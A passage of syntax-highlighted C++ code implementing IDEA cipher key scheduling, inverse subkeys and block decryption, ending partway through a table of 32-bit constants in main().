    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        key tmp_keys <span class="token operator">=</span> keys <span class="token operator">>></span> <span class="token number">103</span><span class="token punctuation">;</span>
        keys <span class="token operator">=</span> <span class="token punctuation">(</span>keys <span class="token operator">&lt;&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> tmp_keys<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>
                sub_key<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> k<span class="token punctuation">]</span> <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> <span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    key tmp_keys <span class="token operator">=</span> keys <span class="token operator">>></span> <span class="token number">103</span><span class="token punctuation">;</span>
    keys <span class="token operator">=</span> <span class="token punctuation">(</span>keys <span class="token operator">&lt;&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> tmp_keys<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">52</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">inv_subkeys_get</span><span class="token punctuation">(</span>code sub_key<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        inv_sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">48</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">50</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">49</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">51</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> sub_key<span class="token punctuation">[</span><span class="token number">46</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> sub_key<span class="token punctuation">[</span><span class="token number">47</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    inv_sub_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    inv_sub_key<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invPlus</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    inv_sub_key<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">invTimes</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> <span class="token function">dencrypt</span><span class="token punctuation">(</span>bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> cipher<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> I_1<span class="token punctuation">,</span> I_2<span class="token punctuation">,</span> I_3<span class="token punctuation">,</span> I_4<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        I_1<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">63</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        I_2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">47</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        I_3<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        I_4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_1 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> I_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_2 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> I_2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_3 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> I_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_4 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> I_4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_5 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_1<span class="token punctuation">,</span> tmp_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_6 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_2<span class="token punctuation">,</span> tmp_4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_7 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tmp_5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_8 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>tmp_6<span class="token punctuation">,</span> tmp_7<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_9 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>tmp_8<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> tmp_10 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>tmp_7<span class="token punctuation">,</span> tmp_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_1 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_1<span class="token punctuation">,</span> tmp_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_2 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_3<span class="token punctuation">,</span> tmp_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_3 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_2<span class="token punctuation">,</span> tmp_10<span class="token punctuation">)</span><span class="token punctuation">;</span>
        I_4 <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span>tmp_4<span class="token punctuation">,</span> tmp_10<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_1 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>I_1<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_2 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>I_3<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_3 <span class="token operator">=</span> <span class="token function">Plus</span><span class="token punctuation">(</span>I_2<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bitset<span class="token operator">&lt;</span><span class="token number">16</span><span class="token operator">></span> Y_4 <span class="token operator">=</span> <span class="token function">Times</span><span class="token punctuation">(</span>I_4<span class="token punctuation">,</span> inv_sub_key<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    bitset<span class="token operator">&lt;</span><span class="token number">64</span><span class="token operator">></span> plaint<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        plaint<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Y_4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        plaint<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> Y_3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        plaint<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> Y_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        plaint<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> Y_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> plaint<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> box1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0xC0BA6CAC</span><span class="token punctuation">,</span> <span class="token number">0x5A05DF1B</span><span class="token punctuation">,</span> <span class="token number">0x9ABFB3B7</span><span class="token punctuation">,</span> <span class="token number">0xB40BBE36</span><span class="token punctuation">,</span> <span class="token number">0x74B1D29A</span><span class="token punctuation">,</span>
        <span class="token number">0xEE0E612D</span><span class="token punctuation">,</span> <span class="token number">0x2EB40D81</span><span class="token punctuation">,</span> <span class="token number">0xB3667A2F</span><span class="token punctuation">,</span> <span class="token number">0x73DC1683</span><span class="token punctuation">,</span> <span class="token number">0xE963A534</span><span class="token punctuation">,</span> <span class="token number">0x29D9C998</span><span class="token punctuation">,</span> <span class="token number">0x076DC419</span><span class="token punctuation">,</span> <span class="token number">0xC7D7A8B5</span><span class="token punctuation">,</span>
        <span class="token number">0x5D681B02</span><span class="token punctuation">,</span> <span class="token number">0x9DD277AE</span><span class="token punctuation">,</span> <span class="token number">0xBDBDF21D</span><span class="token punctuation">,</span> <span class="token number">0x7D079EB1</span><span class="token punctuation">,</span> <span class="token number">0xE7B82D06</span><span class="token punctuation">,</span> <span class="token number">0x270241AA</span><span class="token punctuation">,</span> <span class="token number">0x09B64C2B</span><span class="token punctuation">,</span> <span class="token number">0xC90C2087</span><span class="token punctuation">,</span>
        <span class="token number">0x53B39330</span><span class="token punctuation">,</span> <span class="token number">0x9309FF9C</span><span class="token punctuation">,</span> <span class="token number">0x0EDB8832</span><span class="token punctuation">,</span> <span class="token number">0xCE61E49E</span><span class="token punctuation">,</span> <span class="token number">0x54DE5729</span><span class="token punctuation">,</span> <span class="token number">0x94643B85</span><span class="token punctuation">,</span> <span class="token number">0xBAD03604</span><span class="token punctuation">,</span> <span class="token number">0x7A6A5AA8</span><span class="token punctuation">,</span>
        <span class="token number">0xE0D5E91F</span><span class="token punctuation">,</span> <span class="token number">0x206F85B3</span><span class="token punctuation">,</span> <span class="token number">0xA00AE279</span><span class="token punctuation">,</span> <span class="token number">0x60B08ED5</span><span class="token punctuation">,</span> <span class="token number">0xFA0F3D62</span><span class="token punctuation">,</span> <span class="token number">0x3AB551CE</span><span class="token punctuation">,</span> <span class="token number">0x14015C4F</span><span class="token punctuation">,</span> <span class="token number">0xD4BB30E3</span><span class="token punctuation">,</span>
        <span class="token number">0x4E048354</span><span class="token punctuation">,</span> <span class="token number">0x8EBEEFF8</span><span class="token punctuation">,</span> <span class="token number">0x136C9856</span><span class="token punctuation">,</span> <span class="token number">0xD3D6F4FA</span><span class="token punctuation">,</span> <span class="token number">0x4969474D</span><span class="token punctuation">,</span> <span class="token number">0x89D32BE1</span><span class="token punctuation">,</span> <span class="token number">0xA7672660</span><span class="token punctuation">,</span> <span class="token number">0x67DD4ACC</span><span class="token punctuation">,</span>
        <span class="token number">0xFD62F97B</span><span class="token punctuation">,</span> <span class="token number">0x3DD895D7</span><span class="token punctuation">,</span> <span class="token number">0x1DB71064</span><span class="token punctuation">,</span> <span class="token number">0xDD0D7CC8</span><span class="token punctuation">,</span> <span class="token number">0x47B2CF7F</span><span class="token punctuation">,</span> <span class="token number">0x8708A3D3</span><span class="token punctuation">,</span> <span class="token number">0xA9BCAE52</span><span class="token punctuation">,</span> <span class="token number">0x6906C2FE</span><span class="token punctuation">,</span>
        <span class="token number">0xF3B97149</span><span class="token punctuation">,</span> <span class="token number">0x33031DE5</span><span class="token punctuation">,</span> <span class="token number">0xAED16A4B</span><span class="token punctuation">,</span> <span class="token number">0x6E6B06E7</span><span class="token punctuation">,</span> <span class="token number">0xF4D4B550</span><span class="token punctuation">,</span> <span class="token number">0x346ED9FC</span><span class="token punctuation">,</span> <span class="token number">0x1ADAD47D</span><span class="token punctuation">,</span> <span class="token number">0xDA60B8D1</span><span class="token punctuation">,</span>
        <span class="token number">0x40DF0B66</span><span class="token punctuation">,</span> <span class="token number">0x806567CA</span><span class="token punctuation">,</span> <span class="token number">0x9B64C2B1</span><span class="token punctuation">,</span> <span class="token number">0x5BDEAE1D</span><span class="token punctuation">,</span> <span class="token number">0xC1611DAA</span><span class="token punctuation">,</span> <span class="token number">0x01DB7106</span><span class="token punctuation">,</span> <span class="token number">0x2F6F7C87</span><span class="token punctuation">,</span> <span class="token number">0xEFD5102B</span><span class="token punctuation">,</span>
        <span class="token number">0x756AA39C</span><span class="token punctuation">,</span> <span class="token number">0xB5D0CF30</span><span class="token punctuation">,</span> <span class="token number">0x2802B89E</span><span class="token punctuation">,</span> <span class="token number">0xE8B8D432</span><span class="token punctuation">,</span> <span class="token number">0x72076785</span><span class="token punctuation">,</span> <span class="token number">0xB2BD0B29</span><span class="token punctuation">,</span> <span class="token number">0x9C0906A8</span><span class="token punctuation">,</span> <span class="token number">0x5CB36A04</span><span class="token punctuation">,</span>
        <span class="token number">0xC60CD9B3</span><span class="token punctuation">,</span> <span class="token number">0x06B6B51F</span><span class="token punctuation">,</span> <span class="token number">0x26D930AC</span><span class="token punctuation">,</span> <span class="token number">0xE6635C00</span><span class="token punctuation">,</span> <span class="token number">0x7CDCEFB7</span><span class="token punctuation">,</span> <span class="token number">0xBC66831B</span><span class="token punctuation">,</span> <span class="token number">0x92D28E9A</span><span class="token punctuation">,</span> <span class="token number">0x5268E236</span><span class="token punctuation">,</span>
        <span class="token number">0xC8D75181</span><span class="token punctuation">,</span> <span class="token number">0x086D3D2D</span><span class="token punctuation">,</span> <span class="token number">0x95BF4A83</span><span class="token punctuation">,</span> <span class="token number">0x5505262F</span><span class="token punctuation">,</span> <span class="token number">0xCFBA9598</span><span class="token punctuation">,</span> <span class="token number">0x0F00F934</span><span class="token punctuation">,</span> <span class="token number">0x21B4F4B5</span><span class="token punctuation">,</span> <span class="token number">0xE10E9819</span><span class="token punctuation">,</span>
        <span class="token number">0x7BB12BAE</span><span class="token punctuation">,</span> <span class="token number">0xBB0B4702</span><span class="token punctuation">,</span> <span class="token number">0x3B6E20C8</span><span class="token punctuation">,</span> <span class="token number">0xFBD44C64</span><span class="token punctuation">,</span> <span class="token number">0x616BFFD3</span><span class="token punctuation">,</span> <span class="token number">0xA1D1937F</span><span class="token punctuation">,</span> <span class="token number">0x8F659EFE</span><span class="token punctuation">,</span> <span class="token number">0x4FDFF252</span><span class="token punctuation">,</span>
        <span class="token number">0xD56041E5</span><span class="token punctuation">,</span> <span class="token number">0x15DA2D49</span><span class="token punctuation">,</span> <span class="token number">0x88085AE7</span><span class="token punctuation">,</span> <span class="token number">0x48B2364B</span><span class="token punctuation">,</span> <span class="token number">0xD20D85FC</span><span class="token punctuation">,</span> <span class="token number">0x12B7E950</span><span class="token punctuation">,</span> <span class="token number">0x3C03E4D1</span><span class="token punctuation">,</span> <span class="token number">0xFCB9887D</span><span class="token punctuation">,</span>
        <span class="token number">0x66063BCA</span><span class="token punctuation">,</span> <span class="token number">0xA6BC5766</span><span class="token punctuation">,</span> <span class="token number">0x86D3D2D5</span><span class="token punctuation">,</span> <span class="token number">0x4669BE79</span><span class="token punctuation">,</span> <span class="token number">0xDCD60DCE</span><span class="token punctuation">,</span> <span class="token number">0x1C6C6162</span><span class="token punctuation">,</span> <span class="token number">0x32D86CE3</span><span class="token punctuation">,</span> <span class="token number">0xF262004F</span><span class="token punctuation">,</span>
        <span class="token number">0x68DDB3F8</span><span class="token punctuation">,</span> <span class="token number">0xA867DF54</span><span class="token punctuation">,</span> <span class="token number">0x35B5A8FA</span><span class="token punctuation">,</span> <span class="token number">0xF50FC456</span><span class="token punctuation">,</span> <span class="token number">0x6FB077E1</span><span class="token punctuation">,</span> <span class="token number">0xAF0A1B4D</span><span class="token punctuation">,</span> <span class="token number">0x81BE16CC</span><span class="token punctuation">,</span> <span class="token number">0x41047A60</span><span class="token punctuation">,</span>
        <span class="token number">0xDBBBC9D7</span><span class="token punctuation">,</span> <span class="token number">0x1B01A57B</span><span class="token punctuation">,</span> <span class="token number">0xEDB88321</span><span class="token punctuation">,</span> <span class="token number">0x2D02EF8D</span><span class="token punctuation">,</span> <span class="token number">0xB7BD5C3A</span><span class="token punctuation">,</span> <span class="token number">0x77073096</span><span class="token punctuation">,</span> <span class="token number">0x59B33D17</span><span class="token punctuation">,</span> <span class="token number">0x990951BB</span><span class="token punctuation">,</span>
        <span class="token number">0x03B6E20C</span><span class="token punctuation">,</span> <span class="token number">0xC30C8EA0</span><span class="token punctuation">,</span> <span class="token number">0x5EDEF90E</span><span class="token punctuation">,</span> <span class="token number">0x9E6495A2</span><span class="token punctuation">,</span> <span class="token number">0x04DB2615</span><span class="token punctuation">,</span> <span class="token number">0xC4614AB9</span><span class="token punctuation">,</span> <span class="token number">0xEAD54738</span><span class="token punctuation">,</span> <span class="token number">0x2A6F2B94</span><span class="token punctuation">,</span>
        <span class="token number">0xB0D09823</span><span class="token punctuation">,</span> <span class="token number">0x706AF48F</span><span class="token punctuation">,</span> <span class="token number">0x5005713C</span><span class="token punctuation">,</span> <span class="token number">0x90BF1D90</span><span class="token punctuation">,</span> <span class="token number">0x0A00AE27</span><span class="token punctuation">,</span> <span class="token number">0xCABAC28B</span><span class="token punctuation">,</span> <span class="token number">0xE40ECF0A</span><span class="token punctuation">,</span> <span class="token number">0x24B4A3A6</span><span class="token punctuation">,</span>
        <span class="token number">0xBE0B1011</span><span class="token punctuation">,</span> <span class="token number">0x7EB17CBD</span><span class="token punctuation">,</span> <span class="token number">0xE3630B13</span><span class="token punctuation">,</span> <span class="token number">0x23D967BF</span><span class="token punctuation">,</span> <span class="token number">0xB966D408</span><span class="token punctuation">,</span> <span class="token number">0x79DCB8A4</span><span class="token punctuation">,</span> <span class="token number">0x5768B525</span><span class="token punctuation">,</span> <span class="token number">0x97D2D989</span><span class="token punctuation">,</span>
        <span class="token number">0x0D6D6A3E</span><span class="token punctuation">,</span> <span class="token number">0xCDD70692</span><span class="token punctuation">,</span> <span class="token number">0x4DB26158</span><span class="token punctuation">,</span> <span class="token number">0x8D080DF4</span><span class="token punctuation">,</span> <span class="token number">0x17B7BE43</span><span class="token punctuation">,</span> <span class="token number">0xD70DD2EF</span><span class="token punctuation">,</span> <span class="token number">0xF9B9DF6E</span><span class="token punctuation">,</span> <span class="token number">0x3903B3C2</span><span class="token punctuation">,</span>
